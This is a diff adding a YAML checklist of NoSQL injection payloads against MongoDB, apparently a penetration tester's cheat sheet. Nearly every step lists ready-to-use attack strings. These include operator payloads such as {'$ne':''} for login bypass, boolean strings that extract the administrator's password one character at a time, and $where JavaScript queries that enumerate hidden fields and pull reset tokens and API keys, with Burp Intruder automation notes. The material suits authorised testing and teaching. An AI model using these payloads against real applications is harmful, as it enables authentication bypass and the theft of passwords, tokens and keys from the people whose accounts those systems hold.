@@ -1,0 +1,334 @@
+name: NoSQL Injection (MongoDB)
+
+steps:
+  - title: Identify NoSQL Attack Surface
+    mode: chain
+    info: |
+      Identify MongoDB-backed functionality and injectable parameters.
+
+    entries:
+      - cmd: "'"
+        info: syntax error test
+
+      - cmd: "\""
+        info: quote handling
+
+      - cmd: "{}"
+        info: JSON object handling
+
+      - cmd: "[]"
+        info: array parsing
+
+      - cmd: "null"
+        info: null handling
+
+    look_for:
+      - MongoDB errors
+      - JavaScript errors
+      - stack traces
+      - syntax exceptions
+      - response differences
+
+    notes:
+      - MongoDB injections often expose JavaScript parser behavior
+      - login forms and filters are common targets
+
+  - title: Boolean Injection Detection
+    mode: chain
+    info: |
+      Test whether injected boolean expressions affect application logic.
+
+    entries:
+      - cmd: "' && 1 && 'x"
+        info: true condition
+
+      - cmd: "' && 0 && 'x"
+        info: false condition
+
+      - cmd: "' || 1 || '"
+        info: always true condition
+
+      - cmd: "' && '1'=='1"
+        info: true string comparison
+
+      - cmd: "' && '1'=='2"
+        info: false string comparison
+
+    look_for:
+      - changed responses
+      - missing results
+      - additional data
+      - authentication bypass
+      - response length differences
+
+    notes:
+      - URL encode payloads
+      - compare true vs false responses carefully
+
+  - title: Authentication Bypass
+    mode: chain
+    info: |
+      Test MongoDB operators against login functionality.
+
+    entries:
+      - cmd: "{\"$ne\":\"\"}"
+        info: not equal operator
+
+      - cmd: "{\"$gt\":\"\"}"
+        info: greater than operator
+
+      - cmd: "{\"$regex\":\"admin.*\"}"
+        info: regex user match
+
+      - cmd: "{\"$exists\":true}"
+        info: field existence
+
+      - cmd: "{\"$nin\":[\"\"]}"
+        info: not-in operator
+
+    look_for:
+      - successful login
+      - authentication bypass
+      - account switching
+      - admin access
+      - response differences
+
+    notes:
+      - test both username and password fields
+      - operators often work in JSON requests
+
+  - title: Common MongoDB Operators
+    mode: enum
+    info: |
+      Common operators useful during NoSQL injection testing.
+
+    entries:
+      - cmd: "$ne"
+        info: not equal
+
+      - cmd: "$gt"
+        info: greater than
+
+      - cmd: "$lt"
+        info: less than
+
+      - cmd: "$regex"
+        info: regex matching
+
+      - cmd: "$exists"
+        info: field existence
+
+      - cmd: "$where"
+        info: JavaScript execution
+
+      - cmd: "$in"
+        info: in-array matching
+
+      - cmd: "$nin"
+        info: not-in matching
+
+      - cmd: "$or"
+        info: logical OR
+
+      - cmd: "$and"
+        info: logical AND
+
+    look_for:
+      - accepted operators
+      - modified behavior
+      - filtered operators
+      - backend parsing quirks
+
+  - title: Data Extraction via Boolean Enumeration
+    mode: chain
+    info: |
+      Extract sensitive data using true/false conditions.
+
+    entries:
+      - cmd: "administrator' && this.password.length < 30 || 'a'=='b"
+        info: password length enumeration
+
+      - cmd: "administrator' && this.password[0]=='a"
+        info: character extraction
+
+      - cmd: "administrator' && this.password[1]=='b"
+        info: indexed extraction
+
+      - cmd: "administrator' && this.username=='administrator"
+        info: field verification
+
+    look_for:
+      - true responses
+      - valid account output
+      - response length changes
+      - successful matches
+
+    notes:
+      - enumerate length first
+      - then brute-force character-by-character
+      - automate with Intruder
+
+  - title: Regex Enumeration
+    mode: chain
+    info: |
+      Use regex matching for efficient extraction.
+
+    entries:
+      - cmd: "{\"$regex\":\"admin.*\"}"
+        info: username matching
+
+      - cmd: "{\"$regex\":\"^a.*\"}"
+        info: starts-with matching
+
+      - cmd: "{\"$regex\":\"^admin\"}"
+        info: prefix enumeration
+
+      - cmd: "{\"$regex\":\".*\"}"
+        info: wildcard match
+
+    look_for:
+      - matched users
+      - successful authentication
+      - changed responses
+      - partial matches
+
+    notes:
+      - useful for usernames and tokens
+      - often bypasses exact matching
+
+  - title: JavaScript Injection via $where
+    mode: chain
+    info: |
+      Test whether JavaScript execution is enabled in MongoDB queries.
+
+    entries:
+      - cmd: "\"$where\":\"1\""
+        info: true condition
+
+      - cmd: "\"$where\":\"0\""
+        info: false condition
+
+      - cmd: "\"$where\":\"this.username=='administrator'\""
+        info: object field access
+
+      - cmd: "\"$where\":\"Object.keys(this)\""
+        info: field discovery
+
+    look_for:
+      - evaluated JavaScript
+      - changed responses
+      - server-side execution
+      - field access
+
+    notes:
+      - highly powerful if enabled
+      - useful for blind extraction
+
+  - title: Unknown Field Enumeration
+    mode: chain
+    info: |
+      Enumerate hidden JSON object fields.
+
+    entries:
+      - cmd: "\"$where\":\"Object.keys(this)[0]\""
+        info: first field
+
+      - cmd: "\"$where\":\"Object.keys(this)[1].match('^user.*')\""
+        info: regex field matching
+
+      - cmd: "\"$where\":\"Object.keys(this)[2].match('^token.*')\""
+        info: token discovery
+
+      - cmd: "\"$where\":\"Object.keys(this).length\""
+        info: field count
+
+    look_for:
+      - hidden fields
+      - reset tokens
+      - internal properties
+      - password fields
+
+    notes:
+      - useful for blind enumeration
+      - automate with Intruder cluster bomb
+
+  - title: Token and Secret Extraction
+    mode: chain
+    info: |
+      Extract reset tokens and sensitive object values.
+
+    entries:
+      - cmd: "\"$where\":\"this.resetToken.match('^a.*')\""
+        info: token extraction
+
+      - cmd: "\"$where\":\"this.token[0]=='a'\""
+        info: indexed extraction
+
+      - cmd: "\"$where\":\"this.apiKey.match('^.{0}a.*')\""
+        info: API key enumeration
+
+    look_for:
+      - successful matches
+      - changed responses
+      - valid tokens
+      - leaked secrets
+
+    notes:
+      - enumerate one character at a time
+      - compare valid vs invalid responses
+
+  - title: NoSQL Injection Contexts
+    mode: enum
+    info: |
+      Common vulnerable application functionality.
+
+    entries:
+      - cmd: "Login forms"
+        info: authentication bypass
+
+      - cmd: "Search filters"
+        info: query injection
+
+      - cmd: "User lookups"
+        info: data extraction
+
+      - cmd: "Password reset"
+        info: token abuse
+
+      - cmd: "REST APIs"
+        info: JSON injection
+
+      - cmd: "GraphQL"
+        info: backend query abuse
+
+    look_for:
+      - JSON requests
+      - MongoDB usage
+      - user-controlled queries
+      - JavaScript evaluation
+
+  - title: Useful Burp Workflow
+    mode: enum
+    info: |
+      Common workflow for NoSQL injection testing.
+
+    entries:
+      - cmd: "Proxy"
+        info: capture requests
+
+      - cmd: "Repeater"
+        info: manual testing
+
+      - cmd: "Intruder"
+        info: brute-force enumeration
+
+      - cmd: "Comparer"
+        info: compare responses
+
+      - cmd: "Logger"
+        info: track payload behavior
+
+    notes:
+      - URL encode payloads
+      - compare true/false conditions carefully
+      - automate character extraction with Intruder
